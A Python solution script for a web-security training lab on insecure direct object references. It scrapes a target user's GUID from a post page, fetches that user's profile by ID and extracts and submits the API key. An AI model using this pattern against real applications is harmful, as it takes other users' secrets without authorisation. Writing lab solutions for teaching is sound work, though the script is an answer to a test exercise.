###############################################################################
#
# Lab: User ID controlled by request parameter, with unpredictable user IDs
#
# Hack Steps: 
#      1. Fetch a post published by carlos
#      2. Extract carlos GUID from source code
#      3. Fetch carlos profile using his GUID
#      4. Extract the API key
#      5. Submit the solution
#
###############################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ab5004803981696835919e600310085.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Fetching a post published by carlos.. ", end="", flush=True)
    
    post_page = fetch("/post?postId=3") # Change the postId to that of Carlos's post
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting carlos GUID from source code. ", end="", flush=True)

    carlos_guid = re.findall("userId=(.*)'>carlos", post_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Fetching carlos profile page.. ", end="", flush=True)

    carlos_profile = fetch(f"/my-account?id={carlos_guid}")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the API key.. ", end="", flush=True)

    api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Submitting the solution.. ", end="", flush=True)

    data = { "answer": api_key }
    post_data("/submitSolution", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

